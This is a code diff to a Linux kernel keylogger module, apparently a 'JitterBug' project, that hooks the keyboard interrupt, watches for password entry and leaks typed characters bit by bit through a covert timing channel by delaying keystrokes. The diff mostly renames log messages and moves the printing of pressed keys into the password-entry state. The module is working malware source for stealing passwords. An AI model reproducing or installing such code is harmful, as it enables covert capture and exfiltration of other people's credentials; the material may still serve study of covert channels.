@@ -117,21 +117,21 @@ void jitterbug(void) {
   do_gettimeofday(&timeval_current);
   elapsed = get_milli_diff(&timeval_current, &timeval_previous);
 
-  printk(KERN_INFO "Elapsed (before delay): %ld milli\n", elapsed);
+  printk(KERN_INFO "Elapsed (since last keystroke): %ld milli\n", elapsed);
 
   m = elapsed % window;
 
   if (char_to_send & (0x01 << (7 - jitter_bit_idx))) { // Send a '1'
-    printk(KERN_INFO "!! 1\n");
+    printk(KERN_INFO "SENDING: 1\n");
     mdelay((window - m) + (window / 2));
   } else { // Send a '0'
-    printk(KERN_INFO "!! 0\n");
+    printk(KERN_INFO "SENDING: 0\n");
     mdelay(window - m);
   }
 
   update_time();
 
-  printk(KERN_INFO "Elapsed (after delay): %ld milli\n", get_milli_diff(&timeval_previous, &timeval_current));
+  printk(KERN_INFO "Delay: %ld milli\n", get_milli_diff(&timeval_previous, &timeval_current));
 
   if (jitter_bit_idx == 7) {
     jitter_bit_idx = 0;
@@ -147,9 +147,7 @@ irqreturn_t kbd_interrupt(int irq, void *dummy) {
   unsigned char key;
 
   key = line_put(inb(KBD_DATA_REG), &line_current, &line_previous);
-
-  printk(KERN_INFO "%u pressed!\n", key);
-
+  
   if (key == SPECIAL_KEY) {
     return IRQ_HANDLED;
   }
@@ -166,6 +164,8 @@ irqreturn_t kbd_interrupt(int irq, void *dummy) {
 
   else
   if (state_current == ENTERING_PASSWD) {
+    printk(KERN_INFO "%u pressed!\n", key);
+    
     if (key == '\n') {
       printk(KERN_INFO "TRANSITION: ENTERING_PASSWD -> CONNECTED\n");
 
@@ -196,7 +196,7 @@ irqreturn_t kbd_interrupt(int irq, void *dummy) {
   
 
 int __init keylog_init(void) {
-  printk(KERN_INFO "Hello, world!\n");
+  printk(KERN_INFO "== JITTERBUG ==\n");
 
   initialize_line(&line_current);
   initialize_line(&line_previous);
@@ -209,7 +209,7 @@ int __init keylog_init(void) {
 
 void __exit keylog_exit(void) {
   free_irq(KBD_IRQ, (void *) kbd_interrupt);
-  printk(KERN_INFO "Goodbye, world!\n");
+  printk(KERN_INFO "===============\n");
 
   return;
 }
